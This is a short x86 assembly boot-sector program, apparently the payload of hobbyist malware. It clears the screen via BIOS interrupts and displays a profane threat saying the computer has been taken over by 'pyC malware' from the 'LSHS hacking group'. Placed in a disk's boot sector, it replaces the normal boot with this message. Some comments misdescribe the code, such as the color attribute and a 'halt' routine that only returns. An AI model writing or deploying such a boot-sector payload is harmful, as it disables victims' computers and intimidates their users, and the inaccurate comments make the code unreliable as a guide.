org 0x7c00 
bits 16   

start:
	call cls
	mov bx, display 
	


print:
	mov al, [bx] ; Dereference the BX string pointer, in C this would look like: al = *bx;
	cmp al, 0 ; Check if the character is a NULL terminator
	je halt ; If it is, jump to the halt function
	call print_char ; Print the current character
	inc bx ; Increase the BX string pointer, in C this would look like: bx++;
	jmp print ; Loop until null terminator found

print_char:
	mov ah, 0x0e ; Write character function
	int 0x10 ; BIOS interrupt
	ret ; Return


; Returns from the print function
halt:
	ret

; This functions will be used to initialize registries, set colors, etc.
cls:
	mov ah, 0x07   ; Print function
	mov al, 0x00   ; Lines to scroll
	mov bh, 0x04   ; Black background and white color (This can be changed according to the BIOS colors), same as CMD color command!
	mov cx, 0x00   ; Initialize register
	mov dx, 0x184f ; Initialize register
	int 0x10       ; Call the BIOS interrupt!
	ret            ; Return

display db "UH OH!", 13, 10, " ",13 ,10, " ",13 ,10, "Your computer has been fucked over by the pyC malware", 13, 10, "We will not forgive. If your seeing this than this is your warning", 13, 10, "By the LSHS hacking group", 13, 10, 0 ; The null terminator is very important!
times 510 - ($ - $$) db 0 ; Zero remaining sectors
dw 0xaa55 ; Bootable signature

